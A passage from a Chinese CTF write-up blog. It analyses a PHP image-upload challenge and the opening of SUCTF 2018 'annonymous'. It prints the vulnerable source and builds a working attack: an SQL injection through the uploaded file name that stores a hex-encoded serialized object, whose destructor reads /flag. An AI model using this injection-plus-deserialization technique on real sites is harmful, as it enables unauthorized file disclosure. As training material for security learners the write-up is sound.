class="hljs-string">&quot;DELETE FROM images&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$this</span>-&gt;con, <span class="hljs-variable">$sql</span>);<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这部分很可疑，存在反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>])&#123;<br><span class="hljs-variable">$attr_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>]);<br><span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$attr_temp</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//helper.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$folder</span> = <span class="hljs-string">&quot;pic/&quot;</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = False; <br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;config.txt&quot;</span>;<br><span class="hljs-comment">// The function is not yet perfect, it is not open yet.</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$input</span>=<span class="hljs-string">&quot;file&quot;</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$fileinfo</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getfile</span>(<span class="hljs-variable">$input</span>);<br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;title&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;filename&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;ext&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;ext&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;path&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br><span class="hljs-variable">$img_ext</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$input</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br><span class="hljs-variable">$my_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;width&quot;</span>=&gt;<span class="hljs-variable">$img_ext</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;height&quot;</span>=&gt;<span class="hljs-variable">$img_ext</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;attr&quot;</span>] = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$my_ext</span>);<br><span class="hljs-variable">$id</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$array</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span> == <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="hljs-subst">$id</span>.&lt;/p&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>))&#123;<br><span class="hljs-variable">$rs</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$input</span>]);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$rs</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$basename</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>().<span class="hljs-title function_ invoke__">uniqid</span>()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);<br><span class="hljs-variable">$cate_exts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$cate_exts</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);<br>&#125;<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;<span class="hljs-variable">$title</span>,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;folder.<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data</span> || !<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);<br>&#125;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">insert_array</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$con</span>)) <br>&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>&#125;<br><span class="hljs-variable">$sql_fields</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$sql_val</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br><span class="hljs-variable">$key_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$key</span>);<br><span class="hljs-variable">$value_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$value</span>);<br><span class="hljs-variable">$sql_fields</span>[] = <span class="hljs-string">&quot;`&quot;</span>.<span class="hljs-variable">$key_temp</span>.<span class="hljs-string">&quot;`&quot;</span>;<br><span class="hljs-variable">$sql_val</span>[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$value_temp</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>&#125;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_fields</span>)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_val</span>)).<span class="hljs-string">&quot;)&quot;</span>;<br><span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">mysqli_insert_id</span>(<span class="hljs-variable">$con</span>);<br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;ifview == False)&#123;<br><span class="hljs-keyword">return</span> False;<br><span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span><br>&#125;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-comment"># Read some config html</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">view_files</span>(<span class="hljs-variable">$this</span>-&gt;config);<br>&#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里有个序列化：<code>$array[&quot;attr&quot;] = serialize($my_ext);</code></p><p>还有<code>file_get_contents</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;ifview == False)&#123;<br><span class="hljs-keyword">return</span> False;<br><span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span><br>&#125;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br></code></pre></td></tr></table></figure><p>upload.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./helper.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">upload</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">helper</span> </span>&#123; <span class="hljs-comment">//继承helper</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_base</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>();<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>)&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>])&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file failed.&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">upload</span>();<br><span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">upload_base</span>();<br>&#125;<br>&#125;<br><span class="hljs-comment">//new了一个upload然后调用upload_base()，upload继承了helper</span><br></code></pre></td></tr></table></figure><p>主要分析<code>helper.php</code>：</p><p><code>upload</code> - &gt; <code>getfile</code> - &gt; <code>check</code>，<code>upload</code> - &gt; <code>check</code> -&gt; <code>insert_array</code></p><p>序列化和反序列化处理的是图片的长宽。。反序列化<code>__destruct()</code>会调用<code>view_files</code>然后调用<code>file_get_contents</code>。上传时序列化，<code>show</code>时触发反序列化。现在的问题是我要怎么利用这个图片上传修改数据库中的存储的长宽字段去触发<code>show</code>里的反序列化？这里限制了后缀但没限制文件名，这里面是否能<code>SQL</code>注入？</p><p>参考<code>https://syunaht.com/p/893436503.html</code></p><p>注意这部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br><span class="hljs-variable">$key_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$key</span>);<br><span class="hljs-variable">$value_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$value</span>);<br><span class="hljs-variable">$sql_fields</span>[] = <span class="hljs-string">&quot;`&quot;</span>.<span class="hljs-variable">$key_temp</span>.<span class="hljs-string">&quot;`&quot;</span>;<br><span class="hljs-variable">$sql_val</span>[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$value_temp</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>&#125;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_fields</span>)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_val</span>)).<span class="hljs-string">&quot;)&quot;</span>;<br></code></pre></td></tr></table></figure><p>实际<code>SQL</code>语句就是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> images (`title`,`filename`,`ext`,`path`,`attr`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;xx&#x27;</span>,<span class="hljs-string">&#x27;xx&#x27;</span>,<span class="hljs-string">&#x27;xx&#x27;</span>,<span class="hljs-string">&#x27;xx&#x27;</span>,<span class="hljs-string">&#x27;xx&#x27;</span>)<br></code></pre></td></tr></table></figure><p>文件名可控，构造文件名为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">a<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;payload&#x27;</span>)<span class="hljs-meta">#.jpg</span><br></code></pre></td></tr></table></figure><p>的图片。</p><p>后面就是思考如何利用<code>helper.php</code>中的<code>__destruct()</code>和<code>view_files</code>。注意一开始的定义：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = False; <br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;config.txt&quot;</span>;<br></code></pre></td></tr></table></figure><p>构造：反序列化自动触发<code>__destruct()</code>然后调用<code>view_files</code></p><p>所以可以构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = True;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;/flag&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//注意ifview和config是protected属性，存在不可见字符</span><br></code></pre></td></tr></table></figure><p>以及这么个东西：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$attr_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>]);<br></code></pre></td></tr></table></figure><p>这里把<code>attr</code>中的<code>不可见*不可见</code>全部替换成<code>\0\0\0</code>了，所以要想办法绕过。(一开始没想明白为啥有这么一个<code>waf</code>。。做到这里明白了)</p><p>然后就是一个小知识点：</p><blockquote><p>mysql会自动将十六进制转化为字符串，这也是sql注入的可利用点</p></blockquote><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = True;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;/flag&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>最终<code>payload</code>，注意<code>SQL</code>语句中进制数据没必要用单引号双引号闭合最后一个字段:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">a&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,0x4f3a363a<span class="hljs-number">226865</span>6c<span class="hljs-number">70657222</span>3a323a7b733a393a<span class="hljs-number">2200</span>2a<span class="hljs-number">00696676696577</span>223b623a313b733a393a<span class="hljs-number">2200</span>2a<span class="hljs-number">0063</span>6f6e<span class="hljs-number">66696722</span>3b733a353a222f666c<span class="hljs-number">616722</span>3b7d)#.jpg<br></code></pre></td></tr></table></figure><h4 id="总结思路："><a href="#总结思路：" class="headerlink" title="总结思路："></a>总结思路：</h4><p>如何考虑反序列化的入口和终点？<code>protected</code>属性在反序列化时应注意什么？除此以外，<code>private</code>属性呢？变量覆盖？<code>SQL</code>语句中进制形式的数据是否有必要使用单引号或双引号括起来？</p><h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$MY</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);<br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-number">32</span>));<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function SUCTF_<span class="hljs-subst">$hash</span>()&#123;&quot;</span><br>    .<span class="hljs-string">&quot;global \$MY;&quot;</span><br>    .<span class="hljs-string">&quot;\$MY();&quot;</span><br>    .<span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func_name&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func_name&quot;</span>]();<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>利用<code>create_function</code>创建了一个函数然后给<code>$MY</code>。再利用<code>eval</code>创建了一个函数的定义：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SUCTF_</span>$<span class="hljs-title">hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">global</span> \<span class="hljs-variable">$MY</span>;<br>\<span class="hljs-variable">$MY</span>();<br>&#125;;<br></code></pre></td></tr></table></figure><p>然后<code>GET</code>传参<code>func_name</code>，可以进行函数调用：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">if</span>(isset($_GET[&#x27;func_name&#x27;]))&#123;<br>    $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&quot;func_name&quot;</span>]</span>();<br>    <span class="hljs-built_in">die</span>();<br></code></pre></td></tr></table></figure><p>所以现在的问题就是<code>$hash = bin2hex(openssl_random_pseudo_bytes(32))</code>这个东西。。这个伪随机数不知道怎么 处理。</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105225558">参考资料</a></p><p><a href="https://yang1k.github.io/post/2018-suctf/">参考资料</a></p><blockquote><p>create_function的匿名函数也是有名字的，名字是\x00lambda_%d，其中%d代表他是当前进程中的第几个匿名函数</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span 